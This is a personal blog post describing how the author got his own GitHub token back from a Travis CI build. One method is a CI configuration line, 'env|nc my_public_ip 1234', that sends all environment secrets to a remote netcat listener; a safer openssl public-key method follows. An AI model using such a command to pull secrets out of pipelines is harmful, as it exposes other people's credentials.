---
layout: post
title: How I recovered my GitHub API token from Travis CI
---

A story about secure tokens.

# Introduction

I was working on a project which is compiled to WebAssembly, and I have a
simple web page to test it. I wanted to upload this web page to GitHub pages,
specifically to the `gh-pages` branch of the repository, but I didn't want to
run the commands manually every time I update it.

I had faced a similar problem before, a nice solution is to use Travis CI to
build the project and push the result to `gh-pages`, using a `.travis.yml` file
like the following:

```sh
after_success: |
  [ $TRAVIS_BRANCH = master ] &&
  [ $TRAVIS_PULL_REQUEST = false ] &&
  [ $TRAVIS_RUST_VERSION = nightly ] &&
  # insert command to build the project into target/deploy
  sudo pip install ghp-import &&
  ghp-import -n target/deploy &&
  git push -fq https://${GH_TOKEN}@github.com/${TRAVIS_REPO_SLUG}.git gh-pages
env:
  global:
    secure: "i6nF3p2r...<600 chars more>...FoUw+Xc8=" 
```

The "secure" field is my encrypted GitHub personal access token, which is
needed for the `git push` command.
It is encrypted using the `travis encrypt` command.

```sh
$ travis encrypt GH_TOKEN=secret
Please add the following to your .travis.yml file:

  secure: "i6nF3p2r...<600 chars more>...FoUw+Xc8=" 
```

Then, on the travis console we can see how it is available, but the actual token
was replaced by `[secure]` to hide it from the logs, as the logs are public.

```sh
Setting environment variables from .travis.yml
$ export GH_TOKEN=[secure]
```

So I just copied the `.travis.yml` file into the new repository, and inserted
the commands to compile and deploy the project.

The project compiled fine, but the push to `gh-pages` failed.

```sh
remote: Anonymous access to Badel2/slime_seed_finder.git denied.
fatal: Authentication failed for 'https://@github.com/Badel2/slime_seed_finder.git/'
```

It turns out that this "secure" secret must be encrypted on a
per repository basis, so my attempt to copy that line from one
`.travis.yml` to another repository couldn't possibly work.
The result is a garbage variable being created:

```sh
Setting environment variables from .travis.yml
$ export kye5spzMk4iaRLhsen8F4D45N06q6ZuGysmuqzeQf2aSoyqdM2IOG9CzETO6hcM9eHaTvlbnbz5BfUTselLiXltTQEG64BB4XnrSDcQBWWLUHNEbFjkTxQUzTnSbQQ7BqLONeyq09rqN0mNiHY8zFsKyHrAXFi9GZGTZNCTzVsJ1qRw7pf1e5hlN06i9e8=[secure]
```

So I thought that I can just decrypt the token from one repository and encrypt it
again for the new one.

**But to my surprise there is no "travis decrypt" command!**

Stackoverflow to the rescue:
<https://stackoverflow.com/questions/31519546/how-i-can-decrypt-secure-env-variables>

Nope, you can't decrypt it.

So how could I use the `$GH_TOKEN` in another repo if I had not saved it?

From
[the GitHub help](https://help.github.com/articles/creating-a-personal-access-token-for-the-command-line/):
![Figure 1](https://help.github.com/assets/images/help/settings/personal_access_tokens.png)

If you look closely there is a warning to save the token somewhere, I wonder
why I had decided to ignore it.

When you forget the token you must revoke it and generate a new one. So if you're
reading this to figure out how to get your token back, just generate a new one:
<https://github.com/settings/tokens>,
but for me that would be like giving up.

Luckly the token is still available from the travis console, so if I had ssh
access I could retrieve it, but it looks like this feature is only enabled for
private repositories. It can be enabled for public repositories but you need to
send an email, and I'm too lazy for that.

# Recovering a secret from Travis

So I can execute any command on travis, but both the command and the output will be public, visible to anyone.
Is there any way to retrieve the token without making it public?

At first I thought about encryption, something like:

```sh
$ echo $GH_TOKEN | base64
```

but with a password. But I can't use the password in the command,
because anyone can see the command, decrypt its output
and get the token.

So I started to think about sending the token over the internet, to me.
Luckly I have some experience with port forwarding, so I could just open
a port in the router and direct it to the magic command: netcat

```sh
$ nc --help
nc: invalid option -- '-'
nc -h for help
```

I had used this command for file transfer, it's literally just `cat`
over the network.

The only problem is that my public ip will be visible in the logs,
but luckly I don't have any other open ports so from a security
perspective that's mostly safe.

The process of running a command consists of editing the `.travis.yml` file on
the repository which has access to the token. I just add the following lines:

```yml
before_script:
- env|nc my_public_ip 1234
```

I put the command in the `before_script` section hoping that it will be
executed as soon as possible.

I choose to send the entire output of `env`, which includes all the environment
variables, because why not.

Then, on the listening end:

```sh
$ nc -l -p 1234 | tee /tmp/secret
```

I listen to port 1234 and use the tee command to redirect the output to a file
while still being able to see it on the terminal.

After a few minutes, the token appears on my screen.

```sh
TRAVIS_BUILD_DIR=/home/travis/build/<...>
GH_TOKEN=<REDACTED>
_=/usr/bin/env
```

Success!

Now I can just remove the travis logs and the github commit to hide my IP.

```sh
### Remove last commit from git history:
$ git rebase -i HEAD~1
### d for drop commit
$ git push -f
```

# Alternatives

After writing this post I searched on the internet and found
[this post](https://www.topcoder.com/blog/recover-lost-travisci-variables-two-ways/)
which mentions a nice solution: use `travis encrypt password=1234`
to encrypt the password, encrypt the token with that password,
using `$password` instead of the raw password, and
send it over the internet, or just print it since it's encrypted
anyway.

That made me think, would it be possible to use one passcode to
encrypt the token, but a different one to decrypt it?
It turns out that that's basically public-key cryptography.
We use the public key to encrypt a message, but it can only be
decrypted with the private key.
That's exactly what `travis encrypt` does, I don't know how I hadn't
thought about it.
Let's see how that would work (so the next time I forget the token
I can just copy the commands from here):

```sh
### On my local machine
$ openssl genpkey -algorithm RSA -out private_key.pem -pkeyopt rsa_keygen_bits:2048
.......................................................+++
.........+++
$ openssl rsa -pubout -in private_key.pem -out public_key.pem
writing RSA key
$ cat public_key.pem 
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0MSB5dMBQHB0cnuEi8fN
3XPlC5mXU9WDNL0woL5btaUO5w/bwt8UlcW0S4qQEGhe5bgm4YCdUCIIj4SVrl/p
2Cg56KlG1ep3vAhpGuiHcvz2Sa3PNSxW1IoRndB/N0NM34NEUty+kkQ86eyW8CQh
RWFl5fFS3ApRi7ao20TKWJHdwDU8AkH9+on5PNtZcRzqGvBvCdG1J+5vc7qwkzCV
Dy4O/Imgwamq0bifEVzKUlpYKo5dsddBK75JY5Z2tL7/+1KASNcxvT4hdw0udJzp
jx6E+U68w5UXPxM+vD29JA5WybDzeSO6QZOCCZvXatCEqMWArpLoFpba4skxSP5G
ewIDAQAB
-----END PUBLIC KEY-----
```

We create a key pair and copy the public key to the remote console.

```sh
### On the remote travis console
$ echo '-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0MSB5dMBQHB0cnuEi8fN
3XPlC5mXU9WDNL0woL5btaUO5w/bwt8UlcW0S4qQEGhe5bgm4YCdUCIIj4SVrl/p
2Cg56KlG1ep3vAhpGuiHcvz2Sa3PNSxW1IoRndB/N0NM34NEUty+kkQ86eyW8CQh
RWFl5fFS3ApRi7ao20TKWJHdwDU8AkH9+on5PNtZcRzqGvBvCdG1J+5vc7qwkzCV
Dy4O/Imgwamq0bifEVzKUlpYKo5dsddBK75JY5Z2tL7/+1KASNcxvT4hdw0udJzp
jx6E+U68w5UXPxM+vD29JA5WybDzeSO6QZOCCZvXatCEqMWArpLoFpba4skxSP5G
ewIDAQAB
-----END PUBLIC KEY-----' > public_key.pem
$ echo $GH_TOKEN | openssl rsautl -encrypt -pubin -inkey public_key.pem  > secret_token.txt
$ cat secret_token.txt | base64
L3nC8mdfp7zdvrNR3tq0XCbxIM6JUcjR/308hjvh9iImyqWfAvjlrY65z/9qPRoBgveoZzxF1gFW
qaVIF6y50ZN8WMXkbfiwcOICqA3NGRAP9wBg4o8vut+f3mpT2bEkJwQxl3DRrPBhoK1yAzUm5l84
RbJQN+CkY07lidt8eLw7Xt9YM9HnTZ7eECIN2fhvTPUnMV49JZ1+lXvGxrzkrEDFrNzCJgzMAf9/
qYj4B+rtXtewIhBL9EHme3D1waQsshOvVC2eMVAz2aBDFsNVHC2LGuXTYlBIITqrJzPWO2+NffIb
tVIwt9qpHa6QU8jOtn4Rx7S9S9k0YqSWxgbxnA==
```

We use base64 to encode the encrypted token into readable characters,
because it's binary data, if we just use cat it will show gibberish.
Here I'm assuming the remote console has access to the openssl and base64
commands, but we could just install them anyway.

```sh
### On my local machine again
$ echo 'L3nC8mdfp7zdvrNR3tq0XCbxIM6JUcjR/308hjvh9iImyqWfAvjlrY65z/9qPRoBgveoZzxF1gFW
qaVIF6y50ZN8WMXkbfiwcOICqA3NGRAP9wBg4o8vut+f3mpT2bEkJwQxl3DRrPBhoK1yAzUm5l84
RbJQN+CkY07lidt8eLw7Xt9YM9HnTZ7eECIN2fhvTPUnMV49JZ1+lXvGxrzkrEDFrNzCJgzMAf9/
qYj4B+rtXtewIhBL9EHme3D1waQsshOvVC2eMVAz2aBDFsNVHC2LGuXTYlBIITqrJzPWO2+NffIb
tVIwt9qpHa6QU8jOtn4Rx7S9S9k0YqSWxgbxnA==' | base64 -d > secret_token.txt
$ cat secret_token.txt | openssl rsautl -decrypt -inkey private_key.pem 
<REDACTED>
```

This is nice because we can see the terminal logs from both sides, and still
this is a secure channel. I wonder why this isn't a standard? Oh wait, it is,
that's literally how HTTPS works, but why is there no simple command to achive
a secure data transfer? Hey, I just got an idea for a project.

# Conclusion

While writing this post I experienced an unexpected shutdown, and since I had the
great idea of saving the token in `/tmp`, I have lost the token again.

Luckly I had already added the token to the new repo, so I won't need it until
the next WebAssembly project.

You can see the working project here:

<https://badel2.github.io/slime_seed_finder/>

